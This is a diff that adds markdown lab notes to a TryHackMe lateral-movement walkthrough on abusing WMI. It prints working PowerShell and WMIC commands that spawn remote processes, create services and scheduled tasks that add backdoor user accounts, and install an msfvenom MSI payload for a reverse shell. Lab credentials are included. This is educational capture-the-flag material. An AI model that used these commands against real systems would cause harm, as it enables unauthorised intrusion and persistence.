@@ -367,3 +367,121 @@ sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myser
 sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
 ```
 7. Reverse shell fires → access THMIIS → run flag.exe. 
+
+
+## Task 4: Moving Laterally Using WMI
+
+### What WMI Is
+
+Windows Management Instrumentation (WMI) is Microsoft’s implementation of WBEM, allowing administrators to remotely manage systems.
+Attackers abuse WMI for lateral movement, remote process execution, service creation, scheduled tasks, and MSI installation.
+
+### How to Connect to WMI (PowerShell)
+
+1. Create PSCredential object
+
+```
+$username = 'Administrator'
+$password = 'Mypass123'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+```
+
+2. Choose protocol
+
+- DCOM → RPC (ports 135 + 49152–65535)
+- WSMAN → WinRM (ports 5985/5986)
+
+3. Create WMI session
+
+```
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+### Remote Process Creation (WMI)
+
+PowerShell
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+    CommandLine = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"
+}
+```
+Legacy WMIC
+```
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
+```
+WMI does not return command output — it silently spawns the process.
+
+### Remote Service Creation (WMI)
+
+Create service
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+    Name = "THMService2"
+    DisplayName = "THMService2"
+    PathName = "net user munra2 Pass123 /add"
+    ServiceType = [byte]::Parse("16")
+    StartMode = "Manual"
+}
+```
+
+Start service
+```
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+```
+
+Stop + delete
+```
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+
+### Remote Scheduled Task Creation (WMI)
+```
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+Delete task:
+```
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+###  Installing MSI Packages via WMI
+
+If you copy an MSI to the target (e.g., via SMB to ADMIN$ → C:\Windows\):
+
+PowerShell
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
+    PackageLocation = "C:\Windows\myinstaller.msi"
+    Options = ""
+    AllUsers = $false
+}
+```
+
+Legacy WMIC
+```
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+```
+This is used to execute a reverse shell MSI payload.
+
+### TryHackMe Task Flow (Your Exercise)
+
+- SSH into THMJMP2 using your AD credentials.
+- Use the provided admin creds:
+  - User: ZA.TRYHACKME.COM\t1_corine.waters
+  - Pass: Korine.1994
+- Create MSI payload with msfvenom on AttackBox.
+- Upload MSI to THMIIS via SMB → goes to C:\Windows\.
+- Start Metasploit handler.
+- Create WMI session from THMJMP2.
+- Invoke MSI installation via WMI → triggers reverse shell.
+- On THMIIS reverse shell, run flag.exe on t1_corine.waters desktop.
+- Submit the flag.
